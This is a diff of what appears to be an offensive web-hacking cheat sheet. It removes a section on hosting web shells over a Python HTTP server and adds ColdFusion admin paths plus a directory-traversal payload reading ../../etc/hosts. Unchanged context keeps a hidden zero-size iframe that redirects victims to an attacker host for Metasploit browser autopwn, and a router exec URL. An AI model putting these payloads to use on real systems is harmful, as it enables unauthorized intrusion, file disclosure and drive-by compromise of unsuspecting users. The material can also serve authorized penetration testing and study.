@@ -26,13 +26,6 @@ TRACE     Used for debugging.
 500       Internal Server Error
 ------------------------------------------------------------------------------------------------------
 
-# Simple web server to share out code
-
-Change directory to where your scripts and web shells are located.
-cd /root/scripts/
-python -m SimpleHTTPServer 80
-------------------------------------------------------------------------------------------------------
-
 # Browser Redirection
 
 <iframe SRC="http://attackerIP/report" height = "0" width ="0">
@@ -43,6 +36,14 @@ hacker:  use Metasploit browser autopwn listening on hackerip
 
 x is between 15 and 99.
 https://targetIP/level/x/exec/-/show
+------------------------------------------------------------------------------------------------------
+
+# ColdFusion
+
+/CFIDE/administrator/ 
+/debug/cf_debugFr.cfm
+/CFIDE/debug/cf_debugFr.cfm
+/CFIDE/debug/cf_debugFr.cfm?userPage=../../etc/hosts
 ------------------------------------------------------------------------------------------------------
 
 # Cookie Security Issues - missing HttpOnly or Secure attribute
